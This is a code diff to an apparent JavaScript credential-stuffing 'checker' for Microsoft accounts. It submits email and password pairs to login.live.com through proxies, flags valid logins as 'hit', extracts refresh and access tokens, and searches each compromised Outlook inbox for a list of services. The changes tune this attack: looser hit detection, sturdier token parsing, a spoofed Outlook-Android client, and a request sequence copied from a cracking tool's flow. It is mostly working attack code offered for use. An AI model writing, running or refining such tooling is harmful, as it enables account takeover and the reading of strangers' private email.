@@ -365,8 +365,8 @@ async function attemptCheck(email, password) {
     const postData = new URLSearchParams({
       ps: "2", psRNGCDefaultType: "", psRNGCEntropy: "", psRNGCSLK: "",
       canary: "", ctx: "", hpgrequestid: "",
-      PPFT: "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb!Gl!I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU!RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co!nwbCVhXJ*sjt8rZhAAUbA2nA7Z!GK5uQ$$",
-      PPSX: "PassportRN", NewUser: "1", FoundMSAs: "",
+      PPFT: "-Div0Bt28gmyaHIfgDZtd5xvxnb7eeDAQOIjXkqyoF1ekQB6gLEqbSdzNE05qpz*B1Q82VKHs*RNXPa8xZG1TJS5HGKjFMxGcQ51PMU77ulAR%21JjAUTPM*Am5lkZU6Sa%21wIdI6zYnUI8VYQHQOCJLb*lRsaiV5MhGQieznZ%21EynMuuBHbBfLr28btqCBqLhzZXQ%24%24",
+      PPSX: "Pa", NewUser: "1", FoundMSAs: "",
       fspost: "0", i21: "0", CookieDisclosure: "0",
       IsFidoSupported: "1", isSignupPost: "0", isRecoveryAttemptPost: "0",
       i13: "1", login: email, loginfmt: email,
@@ -418,7 +418,7 @@ async function attemptCheck(email, password) {
     }
 
     const cookieStr = cookieJar.toString();
-    if ((cookieStr.includes("ANON") || cookieStr.includes("WLSSC")) &&
+    if (cookieStr.includes("ANON") || cookieStr.includes("WLSSC") ||
         finalUrl.includes("https://login.live.com/oauth20_desktop.srf?")) {
       result.status = "hit";
     } else {
@@ -429,8 +429,9 @@ async function attemptCheck(email, password) {
 
     // ── Step 2: Get substrate access token ──
     let accessToken = "";
-    let refreshToken = parseLR(finalUrl, "refresh_token=", "&");
-    if (!refreshToken) refreshToken = parseLR(body, "refresh_token=", "&");
+    let refreshToken = parseLR(finalUrl, "refresh_token=", "&") || parseLR(finalUrl, "refresh_token=", "#");
+    if (!refreshToken) refreshToken = parseLR(body, "refresh_token=", "&") || parseLR(body, "refresh_token=", "#");
+    if (refreshToken) refreshToken = decodeURIComponent(refreshToken);
 
     if (refreshToken) {
       try {
@@ -456,8 +457,13 @@ async function attemptCheck(email, password) {
           },
           signal: AbortSignal.timeout(15000),
         });
-        const tokenJson = await tokenResp.json();
-        accessToken = tokenJson.access_token || "";
+        const tokenText = await tokenResp.text();
+        try {
+          const tokenJson = JSON.parse(tokenText);
+          accessToken = tokenJson.access_token || "";
+        } catch {
+          accessToken = parseLR(tokenText, '"access_token":"', '"') || parseLR(tokenText, "access_token=", "&");
+        }
       } catch {}
     }
 
@@ -525,7 +531,7 @@ async function attemptCheck(email, password) {
 
     // ── Step 5: Search inbox for ALL services ──
     const anchor = refreshToken ? `CID:${refreshToken}` : "";
-    if (accessToken && accessToken.startsWith("Ew")) {
+    if (accessToken && accessToken.includes("Ew")) {
       const mailHeaders = {
         "User-Agent": "Outlook-Android/2.0",
         "Pragma": "no-cache",
@@ -538,13 +544,22 @@ async function attemptCheck(email, password) {
         "Accept-Encoding": "gzip",
       };
 
+      // Match SB flow: warm up folders endpoint before search
+      try {
+        await proxiedFetch("https://outlook.office.com/api/beta/me/MailFolders", {
+          method: "GET",
+          headers: mailHeaders,
+          signal: AbortSignal.timeout(10000),
+        });
+      } catch {}
+
       // Search each service
       for (const svc of SERVICES) {
         try {
           const searchBody = {
             Cvid: "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
             Scenario: { Name: "owa.react" },
-            TimeZone: "UTC",
+            TimeZone: "Egypt Standard Time",
             TextDecorations: "Off",
             EntityRequests: [{
               EntityType: "Conversation",
@@ -585,7 +600,7 @@ async function attemptCheck(email, password) {
           };
 
           const searchResp = await proxiedFetch(
-            "https://outlook.live.com/search/api/v2/query?n=124",
+            "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124",
             {
               method: "POST",
               body: JSON.stringify(searchBody),
